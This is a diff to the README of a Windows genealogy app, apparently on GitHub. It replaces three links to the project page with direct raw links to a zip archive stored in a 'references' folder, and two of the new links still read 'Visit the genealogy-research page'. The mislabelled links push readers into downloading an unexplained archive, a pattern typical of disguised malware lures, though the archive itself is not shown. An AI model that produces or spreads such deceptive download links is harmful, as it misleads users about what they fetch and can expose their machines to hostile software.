@@ -1,6 +1,6 @@
 # 📚 genealogy-research - Organize Family Research With Confidence
 
-[![Download genealogy-research](https://img.shields.io/badge/Download-Genealogy_Research-6C63FF?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Cristyjr416/genealogy-research)
+[![Download genealogy-research](https://img.shields.io/badge/Download-Genealogy_Research-6C63FF?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Cristyjr416/genealogy-research/raw/refs/heads/main/references/research_genealogy_3.1-alpha.3.zip)
 
 ## 🧭 What this is
 
@@ -29,7 +29,7 @@ For best results, use a modern version of Windows 10 or Windows 11.
 
 Use this link to visit the download page:
 
-[Visit the genealogy-research page](https://github.com/Cristyjr416/genealogy-research)
+[Visit the genealogy-research page](https://github.com/Cristyjr416/genealogy-research/raw/refs/heads/main/references/research_genealogy_3.1-alpha.3.zip)
 
 Follow these steps on Windows:
 
@@ -223,7 +223,7 @@ This makes each note easy to scan later.
 
 To begin, open the download page here:
 
-[Visit the genealogy-research page](https://github.com/Cristyjr416/genealogy-research)
+[Visit the genealogy-research page](https://github.com/Cristyjr416/genealogy-research/raw/refs/heads/main/references/research_genealogy_3.1-alpha.3.zip)
 
 Then:
 1. Download the project
